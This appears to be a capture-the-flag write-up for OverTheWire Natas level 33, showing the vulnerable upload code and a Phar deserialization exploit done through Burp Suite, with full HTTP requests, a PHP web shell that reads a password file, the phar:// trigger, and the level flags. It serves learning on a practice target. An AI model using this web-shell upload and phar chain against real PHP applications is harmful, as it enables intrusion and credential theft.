# Natas Level 32 → Level 33 Phar deserialization attack

## Previous Flag
<b>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ</b>

## Goal
Username: natas33<br>
URL: http://natas33.natas.labs.overthewire.org<br>

Can you get it right?<br>
Upload Firmware Update:<br>
Choose File: No file chosen<br>
Upload File

## What I learned
```
Phar deserialization attacks are a type of vulnerability in PHP applications that occur when untrusted Phar (PHP Archive) files are processed in a way that allows malicious object deserialization

Executor class gets filename from POST request and checks if over filesize limit (4096 bytes)
Some CTF challenges involving PHP hash comparisons using == (loose comparison operator) start w/ Oe (scientific notation)

Phar Deserialization: https://www.sonarsource.com/blog/new-php-exploitation-technique/?ref=learnhacking.io
```

## Solution
```
View source code
http://natas33.natas.labs.overthewire.org/index-source.html

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
    </head>
    <body>
        <?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>

        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <?php
                session_start();
                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
                    new Executor();
                }
            ?>
            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>

@trungdullc ➜ /workspaces/01noobHacker (main) $ php -d phar.readonly=false scripts/natas33.php ⌨️
@trungdullc ➜ /workspaces/01noobHacker (main) $ ls ⌨️
README.md  natas.phar👀  overthewire  scripts  static  tools

Burp Suite: http://natas33.natas.labs.overthewire.org/
Upload scripts/shell.php
Right click send to Repeater

Original:
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 489
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0LTWoFoJNBQ5TAqv
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas33.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cbupqcitspquldu0jlh0sdd8np
Connection: keep-alive

------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="filename"

cbupqcitspquldu0jlh0sdd8np
------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
------WebKitFormBoundary0LTWoFoJNBQ5TAqv--

Modified: 
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 489
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0LTWoFoJNBQ5TAqv
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas33.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cbupqcitspquldu0jlh0sdd8np
Connection: keep-alive

------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="filename"

shell.php👀 (No need send in Burp Browser, Forward instead w/ changes)
------WebKitFormBoundary0LTWoFoJNBQ5TAqv
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
------WebKitFormBoundary0LTWoFoJNBQ5TAqv--

The update has been uploaded to: /natas33/upload/shell.php 🐱‍💻
Firmware upgrad initialised.
Failur! MD5sum mismatch!

Burp Suite: upload natas.phar
Original:
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 702
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhPS0ThRoe6wiklqK
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cbupqcitspquldu0jlh0sdd8np
Connection: keep-alive

------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="filename"

cbupqcitspquldu0jlh0sdd8np
------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Â

Modified to Forward:
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 702
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhPS0ThRoe6wiklqK
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cbupqcitspquldu0jlh0sdd8np
Connection: keep-alive

------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="filename"

natas.phar 👀
------WebKitFormBoundaryhPS0ThRoe6wiklqK
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Â

The update has been uploaded to: /natas33/upload/natas.phar
Firmware upgrad initialised.
Failur! MD5sum mismatch!

Uploaded both files, now need to trigger md5_file() one more time with phar://natas.phar/test.txt
    phar://         a stream wrapper specific to Phar files
    test.txt        dummy file we archived in our Phar file

Upload natas.phar one more time but modify link
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 702
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Accept-Language: en-US,en;q=0.9
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryquPQAGv4Ek6r70kS
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=cbupqcitspquldu0jlh0sdd8np
Connection: keep-alive

------WebKitFormBoundaryquPQAGv4Ek6r70kS
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
------WebKitFormBoundaryquPQAGv4Ek6r70kS
Content-Disposition: form-data; name="filename"

phar://natas.phar/test.txt 👀
------WebKitFormBoundaryquPQAGv4Ek6r70kS
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Â

Congratulations! Running firmware update: shell.php
j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY 🔐
```

![alt text](/static/natas33.png "Congratulations")

## Flag
<b>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY</b>

## Continue
[Continue](/overthewire/Natas3334.md)